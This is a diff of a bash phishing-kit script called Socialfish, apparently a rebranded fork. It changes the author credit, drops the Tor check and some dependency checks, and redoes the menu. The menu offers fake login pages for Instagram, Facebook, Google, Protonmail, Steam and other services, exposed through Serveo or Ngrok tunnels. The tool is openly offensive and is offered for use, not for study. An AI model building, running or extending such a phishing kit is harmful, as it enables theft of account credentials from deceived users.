@@ -1,25 +1,13 @@
 #!/usr/bin/bash
 # Modern Phising The Socialfish
 # Coded by Senja
-# Github: github.com/thedarksec/Socialfish
+# Github: github.com/stepbystepexe/Socialfish
 
 checkroot() {
 
 if [[ "$(id -u)" -ne 0 ]]; then
-    printf "\e[1;77mPlease, run this program as root!\n\e[0m"
+    printf "\e[0m[\e[1;91m!\e[0m] \e[1;77mPlease, run this program as root!\n\n\e[0m"
     exit 1
-fi
-
-}
-
-checktor() {
-
-check=$(curl --socks5-hostname localhost:9050 -s https://www.google.com > /dev/null; echo $?)
-
-if [[ "$check" -gt 0 ]]; then
-    printf "\e[1;77mPlease, check your TOR Connection! Just type \"tor\" or \"service tor start\"\n\e[0m"
-    exit 1
-
 fi
 
 }
@@ -34,17 +22,9 @@ sleep 1
 
 dependencies() {
 
-command -v tor > /dev/null 2>&1 || { echo >&2 "I require tor but it's not installed. Run ./install.sh. Aborting."; exit 1; }
+command -v bash > /dev/null 2>&1 || { echo >&2 "I require bash but it's not installed. Run ./install.sh. Aborting."; exit 1; }
 command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Run ./install.sh. Aborting."; exit 1; }
 command -v openssl > /dev/null 2>&1 || { echo >&2 "I require openssl but it's not installed. Run ./install.sh Aborting."; exit 1; }
-
-command -v awk > /dev/null 2>&1 || { echo >&2 "I require awk but it's not installed. Aborting."; exit 1; }
-command -v sed > /dev/null 2>&1 || { echo >&2 "I require sed but it's not installed. Aborting."; exit 1; }
-command -v cat > /dev/null 2>&1 || { echo >&2 "I require cat but it's not installed. Aborting."; exit 1; }
-command -v tr > /dev/null 2>&1 || { echo >&2 "I require tr but it's not installed. Aborting."; exit 1; }
-command -v wc > /dev/null 2>&1 || { echo >&2 "I require wc but it's not installed. Aborting."; exit 1; }
-command -v cut > /dev/null 2>&1 || { echo >&2 "I require cut but it's not installed. Aborting."; exit 1; }
-command -v uniq > /dev/null 2>&1 || { echo >&2 "I require uniq but it's not installed. Aborting."; exit 1; }
 
 if [ $(ls /dev/urandom >/dev/null; echo $?) == "1" ]; then
 echo "/dev/urandom not found!"
@@ -66,9 +46,7 @@ printf "\n"
 
 template() {
 
-printf "\e[0m[\e[1;94m#\e[0m] \e[0mModern Phising Socialfish\n\e[0m"
-printf "\e[0m[\e[1;93m*\e[0m] \e[0mCoded by Senja\n\e[0"
-printf "\e[0m[\e[1;96m&\e[0m] \e[0mMy Github: @thedarksec\n\e[0m"
+printf "\e[0;47;90;1m:  Modern Phising Socialfish v1.0, Coded by @stepbystep  :\e[0m\n"
 sleep 1
 
 }
@@ -76,14 +54,19 @@ sleep 1
 menu() {
 
 printf "\n"
-printf "\e[0m[\e[1;92m01\e[0m] \e[1;77mInstagram     \e[0m[\e[1;92m08\e[0m] \e[1;77mYahoo         \e[0m[\e[1;92m15\e[0m] \e[1;77mMicrosoft\n"
-printf "\e[0m[\e[1;92m02\e[0m] \e[1;77mFacebook      \e[0m[\e[1;92m09\e[0m] \e[1;77mPinterest     \e[0m[\e[1;92m16\e[0m] \e[1;77mNetflix\n"
-printf "\e[0m[\e[1;92m03\e[0m] \e[1;77mTwitter       \e[0m[\e[1;92m10\e[0m] \e[1;77mGitlab        \e[0m[\e[1;92m17\e[0m] \e[1;77mSpotify\n"
-printf "\e[0m[\e[1;92m04\e[0m] \e[1;77mSnapchat      \e[0m[\e[1;92m11\e[0m] \e[1;77mLinkedin      \e[0m[\e[1;92m18\e[0m] \e[1;77mInstaFollow\n"
-printf "\e[0m[\e[1;92m05\e[0m] \e[1;77mGoogle        \e[0m[\e[1;92m12\e[0m] \e[1;77mOrigin        \e[0m[\e[1;92m19\e[0m] \e[1;77mGameMobile\n"
-printf "\e[0m[\e[1;92m06\e[0m] \e[1;77mWordpress     \e[0m[\e[1;92m13\e[0m] \e[1;77mGithub        \e[0m[\e[1;92m20\e[0m] \e[1;77mCustom\n"
-printf "\e[0m[\e[1;92m07\e[0m] \e[1;77mProtonmail    \e[0m[\e[1;92m14\e[0m] \e[1;77mSteam         \e[0m[\e[1;92m00\e[0m] \e[1;77mExit\n"
-printf "\n"
+printf "\e[0m[\e[1;96m01\e[0m] \e[1;77mInstagram     \e[0m[\e[1;96m08\e[0m] \e[1;77mYahoo         \e[0m[\e[1;96m15\e[0m] \e[1;77mMicrosoft\n"
+printf "\e[0m[\e[1;96m02\e[0m] \e[1;77mFacebook      \e[0m[\e[1;96m09\e[0m] \e[1;77mPinterest     \e[0m[\e[1;96m16\e[0m] \e[1;77mNetflix\n"
+printf "\e[0m[\e[1;96m03\e[0m] \e[1;77mTwitter       \e[0m[\e[1;96m10\e[0m] \e[1;77mGitlab        \e[0m[\e[1;96m17\e[0m] \e[1;77mSpotify\n"
+printf "\e[0m[\e[1;96m04\e[0m] \e[1;77mSnapchat      \e[0m[\e[1;96m11\e[0m] \e[1;77mLinkedin      \e[0m[\e[1;96m18\e[0m] \e[1;77mInstaFollow\n"
+printf "\e[0m[\e[1;96m05\e[0m] \e[1;77mGoogle        \e[0m[\e[1;96m12\e[0m] \e[1;77mOrigin        \e[0m[\e[1;96m19\e[0m] \e[1;77mGameMobile\n"
+printf "\e[0m[\e[1;96m06\e[0m] \e[1;77mWordpress     \e[0m[\e[1;96m13\e[0m] \e[1;77mGithub        \e[0m[\e[1;96m20\e[0m] \e[1;77mCustom\n"
+printf "\e[0m[\e[1;96m07\e[0m] \e[1;77mProtonmail    \e[0m[\e[1;96m14\e[0m] \e[1;77mSteam         \e[0m[\e[1;96m21\e[0m] \e[1;77mOthers\n"
+echo
+printf "\e[0m[\e[1;93m&\e[0m] LICENSE\n"
+printf "\e[0m[\e[1;94m#\e[0m] Information\n"
+printf "\e[0m[\e[1;92m*\e[0m] Update\n"
+printf "\e[0m[\e[1;91m-\e[0m] Exit\n"
+echo
 
 read -p $'\n\e[0m[\e[0m\e[95m/\e[0m\e[0m] \e[1;77mSelect an option: \e[0m\en' option
 
@@ -167,7 +150,29 @@ server="create"
 createpage
 start1
 
-elif [[ $option == 00 || $option == 0 ]]; then
+elif [[ $option == 21 ]]; then
+server="others"
+start1
+
+elif [[ $option == '&' ]]; then
+echo
+nano LICENSE
+echo
+exit 1
+
+elif [[ $option == '#' ]]; then
+echo
+nano README.md
+echo
+exit 1
+
+elif [[ $option == '*' ]]; then
+echo
+git pull origin master
+echo
+exit 1
+
+elif [[ $option == '-' ]]; then
 echo
 printf "\e[0m[\e[1;91m!\e[0m] \e[0;1;77mExit the program!\n\e[0m"
 echo
@@ -511,8 +516,8 @@ rm -rf sendlink
 fi
 
 printf "\n"
-printf "\e[0m[\e[1;96m1\e[0m] \e[0;1;77mServeo.net (SSH Tunneling, Best!)\e[0m\n"
-printf "\e[0m[\e[1;96m2\e[0m] \e[0;1;77mNgrok\e[0m\n"
+printf "\e[0m[\e[1;92m1\e[0m] \e[0;1;77mServeo.net (SSH Tunneling, Best!)\e[0m\n"
+printf "\e[0m[\e[1;92m2\e[0m] \e[0;1;77mNgrok\e[0m\n"
 default_option_server="1"
 read -p $'\n\e[0m[\e[1;93m+\e[0m] Choose a Port Forwarding option: \e[0;1;77m\en' option_server
 option_server="${option_server:-${default_option_server}}"
@@ -556,7 +561,6 @@ done
 }
 
 #checkroot
-#checktor
 #dependencies
 clearscreen
 banner
